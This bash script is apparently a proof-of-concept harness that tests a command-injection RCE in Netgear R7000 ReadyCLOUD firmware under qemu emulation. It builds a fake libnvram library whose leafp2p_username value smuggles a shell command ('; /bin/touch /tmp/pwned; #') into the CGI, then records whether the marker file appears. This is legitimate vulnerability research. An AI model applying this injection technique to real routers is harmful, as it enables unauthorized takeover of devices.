#!/usr/bin/env bash
set -euo pipefail

WORK=${WORK:-/tmp/netgear_readycloud_comm_rce_2026_06_08}
ORIG=${ORIG:-/root/inout/firmware/unpacked/netgear/R7000-V1.0.9.18_1.2.27/_R7000-V1.0.9.18_1.2.27.chk.extracted/squashfs-root}
ROOT="$WORK/rootfs"
OUT="$WORK/leafp2p_to_comm_rce_evidence.txt"
SRC="$WORK/libnvram_stateful_leafp2p.c"
SO="$WORK/libnvram_stateful_leafp2p.so"
STORE="$ROOT/tmp/readycloud_nvram_store"

mkdir -p "$WORK"

cat > "$SRC" <<'C'
typedef unsigned int size_t;

#define O_WRONLY 00000001
#define O_CREAT  00000100
#define O_APPEND 00002000

static int streq(const char *a, const char *b) {
    while (*a && *b && *a == *b) {
        a++;
        b++;
    }
    return *a == 0 && *b == 0;
}

static size_t slen(const char *s) {
    size_t n = 0;
    while (s && s[n]) {
        n++;
    }
    return n;
}

static long sc3(long n, long a, long b, long c) {
    register long r0 __asm__("r0") = a;
    register long r1 __asm__("r1") = b;
    register long r2 __asm__("r2") = c;
    register long r7 __asm__("r7") = n;
    __asm__ volatile ("svc 0" : "+r"(r0) : "r"(r1), "r"(r2), "r"(r7) : "memory");
    return r0;
}

static void append2(const char *a, const char *b) {
    long fd = sc3(5, (long)"/tmp/readycloud_c_nvram_set.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (fd < 0) {
        return;
    }
    sc3(4, fd, (long)a, slen(a));
    sc3(4, fd, (long)"=", 1);
    sc3(4, fd, (long)b, slen(b));
    sc3(4, fd, (long)"\n", 1);
    sc3(6, fd, 0, 0);
}

char *nvram_get(const char *key) {
    append2("GET", key ? key : "(null)");
    if (streq(key, "rcagent_path")) {
        return "/opt/rcagent";
    }
    if (streq(key, "leafp2p_path")) {
        return "/opt/leafp2p";
    }
    if (streq(key, "remote_path")) {
        return "/opt/remote";
    }
    if (streq(key, "readycloud_control_path")) {
        return "/opt/broken";
    }
    if (streq(key, "leafp2p_username")) {
        return "routeruser; /bin/touch /tmp/pwned; #";
    }
    if (streq(key, "leafp2p_password")) {
        return "routerpass";
    }
    return "";
}

char *nvram_safe_get(const char *key) {
    return nvram_get(key);
}

int nvram_set(const char *key, const char *value) {
    append2(key ? key : "(null)", value ? value : "");
    return 0;
}

int nvram_commit(void) {
    append2("COMMIT", "1");
    return 0;
}

int nvram_unset(const char *key) {
    (void)key;
    return 0;
}
C

if command -v arm-linux-gnueabi-gcc >/dev/null 2>&1; then
  arm-linux-gnueabi-gcc -shared -fPIC -nostdlib -Wl,--hash-style=sysv -Wl,-soname,libnvram.so -o "$SO" "$SRC"
elif command -v arm-linux-gnueabihf-gcc >/dev/null 2>&1; then
  arm-linux-gnueabihf-gcc -shared -fPIC -nostdlib -Wl,--hash-style=sysv -Wl,-soname,libnvram.so -o "$SO" "$SRC"
else
  echo "No ARM cross compiler found" >&2
  exit 1
fi

rm -rf "$ROOT"
cp -a "$ORIG" "$ROOT"
mkdir -p "$ROOT/usr/bin"
cp /usr/bin/qemu-arm-static "$ROOT/usr/bin/qemu-arm-static"
cp "$SO" "$ROOT/usr/lib/libnvram.so"
mkdir -p "$ROOT/opt/readycloud/bin" "$ROOT/tmp"

cat > "$ROOT/opt/readycloud/bin/readycloud_nvram" <<'SH'
#!/bin/sh
STORE=/tmp/readycloud_nvram_store
echo "readycloud_nvram $*" >> /tmp/readycloud_leafp2p_wrapper.log
if [ "$1" = "get" ]; then
    case "$2" in
        readycloud_fetch_url)
            printf '%s\n' 'https://readycloud.invalid/device/entry'
            ;;
        readycloud_hostname)
            if [ -f /tmp/readycloud_c_nvram_set.log ]; then
                sed -n 's/^readycloud_hostname=//p' /tmp/readycloud_c_nvram_set.log | tail -n 1
            else
                printf '%s\n' 'routeruser'
            fi
            ;;
        readycloud_password)
            if [ -f /tmp/readycloud_c_nvram_set.log ]; then
                sed -n 's/^readycloud_password=//p' /tmp/readycloud_c_nvram_set.log | tail -n 1
            else
                printf '%s\n' 'routerpass'
            fi
            ;;
        x_agent_id)
            printf '%s\n' 'xagent-local'
            ;;
        *)
            printf '\n'
            ;;
    esac
elif [ "$1" = "set" ]; then
    echo "$2" >> "$STORE"
elif [ "$1" = "commit" ]; then
    :
fi
exit 0
SH

cat > "$ROOT/opt/readycloud/bin/curl" <<'SH'
#!/bin/sh
echo "curl $*" >> /tmp/readycloud_leafp2p_wrapper.log
cat >/tmp/readycloud_leafp2p_curl_stdin.bin
printf '%s\n' 'SUCCESS'
exit 0
SH

cat > "$ROOT/opt/readycloud/bin/remote_smb_conf" <<'SH'
#!/bin/sh
echo "remote_smb_conf $*" >> /tmp/readycloud_leafp2p_wrapper.log
printf '%s\n' 'R7000'
exit 0
SH

cat > "$ROOT/opt/readycloud/bin/system" <<'SH'
#!/bin/sh
echo "system $*" >> /tmp/readycloud_leafp2p_wrapper.log
printf '%s\n' 'SERIALLOCAL'
exit 0
SH

cat > "$ROOT/opt/readycloud/bin/version" <<'SH'
#!/bin/sh
echo "version $*" >> /tmp/readycloud_leafp2p_wrapper.log
printf '%s\n' 'dummy'
printf '%s\n' 'U12H270T00/V1.0.9.18/20171208'
exit 0
SH

chmod +x "$ROOT/opt/readycloud/bin/readycloud_nvram" \
  "$ROOT/opt/readycloud/bin/curl" \
  "$ROOT/opt/readycloud/bin/remote_smb_conf" \
  "$ROOT/opt/readycloud/bin/system" \
  "$ROOT/opt/readycloud/bin/version"

rm -f "$OUT" "$STORE" "$ROOT/tmp/pwned" "$ROOT/tmp/readycloud_leafp2p_wrapper.log" \
  "$ROOT/tmp/readycloud_c_nvram_set.log" \
  "$ROOT/tmp/readycloud_leafp2p_curl_stdin.bin"

BODY='{"id":"readycloud","state":"1","owner":"alice@example.com","password":"plainpass"}'
printf '%s' "$BODY" > "$ROOT/tmp/input.json"

cat "$ROOT/tmp/input.json" | PATH_INFO=/api/services/readycloud REQUEST_METHOD=PUT \
  chroot "$ROOT" /usr/bin/qemu-arm-static /opt/broken/readycloud_control.cgi \
  > "$WORK/leafp2p_to_comm.stdout" 2> "$WORK/leafp2p_to_comm.stderr" || true

{
  echo "Netgear R7000 ReadyCLOUD leafp2p-to-comm RCE attempt"
  echo "Date: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
  echo
  echo "[input]"
  cat "$ROOT/tmp/input.json"
  echo
  echo "[stdout]"
  cat "$WORK/leafp2p_to_comm.stdout"
  echo "[stderr]"
  cat "$WORK/leafp2p_to_comm.stderr"
  echo "[nvram-store]"
  if [ -f "$STORE" ]; then cat "$STORE"; else echo "no-store"; fi
  echo "[c-nvram-log]"
  if [ -f "$ROOT/tmp/readycloud_c_nvram_set.log" ]; then
    cat "$ROOT/tmp/readycloud_c_nvram_set.log"
  else
    echo "no-c-nvram-log"
  fi
  echo "[wrapper-log]"
  if [ -f "$ROOT/tmp/readycloud_leafp2p_wrapper.log" ]; then
    cat "$ROOT/tmp/readycloud_leafp2p_wrapper.log"
  else
    echo "no-wrapper"
  fi
  echo "[curl-stdin]"
  if [ -f "$ROOT/tmp/readycloud_leafp2p_curl_stdin.bin" ]; then
    head -c 700 "$ROOT/tmp/readycloud_leafp2p_curl_stdin.bin"
    echo
  else
    echo "no-curl-stdin"
  fi
  echo "[pwned]"
  if [ -f "$ROOT/tmp/pwned" ]; then
    ls -l "$ROOT/tmp/pwned"
    cat "$ROOT/tmp/pwned" || true
  else
    echo "no"
  fi
} > "$OUT"

echo "$OUT"
